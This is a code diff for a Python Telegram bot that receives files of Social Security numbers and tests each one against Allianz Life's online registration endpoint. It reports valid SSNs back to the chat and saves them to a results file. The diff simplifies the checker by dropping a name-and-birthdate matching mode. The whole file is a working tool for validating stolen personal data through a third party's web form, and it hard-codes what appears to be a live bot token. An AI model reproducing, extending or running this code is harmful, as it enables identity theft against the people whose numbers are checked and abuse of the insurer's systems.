@@ -9,8 +9,7 @@ bot = TeleBot("7006291100:AAGJXfAJpTPjHoUzTjzH15XwpOioopvU6K4")
 admins = [1971995086,1396561970]
 
 
-
-def check_ssn(ssn:int,full_ssn = False,full = [],recheck = True):
+def check_ssn(ssn:int):
     url = "https://www.allianzlife.com/Registration/individual"
     session = Session()
     resp = session.get(url)
@@ -48,32 +47,9 @@ def check_ssn(ssn:int,full_ssn = False,full = [],recheck = True):
         ,"IndividualIdProofing.DateOfBirthYear":"2003"
         ,"chimeraRegisteredPageData":{"pageId":page_id}
     }
-    if full_ssn == False:
-        response = session.post("https://www.allianzlife.com/SPA/Registration/Handle", json=data , headers= headers)
-        if "Show error message" in response.text: return False
-        return True
-    else:
-        data["IndividualIdProofing.LastName"] = full[0]
-        data["IndividualIdProofing.FirstName"] = full[1]
-        data["IndividualIdProofing.DateOfBirthMonth"] = full[3]
-        data["IndividualIdProofing.DateOfBirthDay"] = full[4]
-        data["IndividualIdProofing.DateOfBirthYear"] = full[5]
-        response = session.post("https://www.allianzlife.com/SPA/Registration/Handle", json=data , headers= headers)
-        if "fail-existing-account-found" in response.text or not ( "fail-data-mismatch" in response.text or "Show error message" in response.text ) :
-            return True
-        else:
-            if recheck : return False
-            else:
-                full[0],full[1] = full[1],full[0]
-                return check_ssn(ssn,full_ssn,full,True)
-        
-def check_format(ssn:str):
-    pattern = r'^([^,]+),([^,]+),(\d+),(\d+),(\d+),(\d+)$'
-    if ssn.isdecimal():
-        return 0
-    elif re.match(pattern,ssn):
-        return 1
-    else : return -1 #ignore
+    response = session.post("https://www.allianzlife.com/SPA/Registration/Handle", json=data , headers= headers)
+    if "Show error message" in response.text: return False
+    return True
 
     
 def save_ssn(ssn:int,name):
@@ -98,18 +74,10 @@ def doc_handler(message):
         bot.send_message(message.chat.id,"Successfully Received SSN File")
         bot.send_message(message.chat.id,f"Checking 🕐... ID : {name}")
         for ssn in SSNs:
-            format_ = check_format(ssn)
-            if format_ == 0:
-                if check_ssn(ssn):
-                    successful += 1
-                    send_telegam(ssn,message.chat.id)
-                    save_ssn(ssn,name)
-            elif format_ == 1:
-                ssn_ = ssn.split(",")
-                if check_ssn(ssn_[2],True,ssn_):
-                    successful += 1
-                    send_telegam(ssn,message.chat.id)
-                    save_ssn(ssn,name)
+            if check_ssn(ssn):
+                successful += 1
+                send_telegam(ssn,message.chat.id)
+                save_ssn(ssn,name)
     try:
         file = open(f"succ-{name}.txt","r")
         bot.send_document(message.chat.id,document = file)
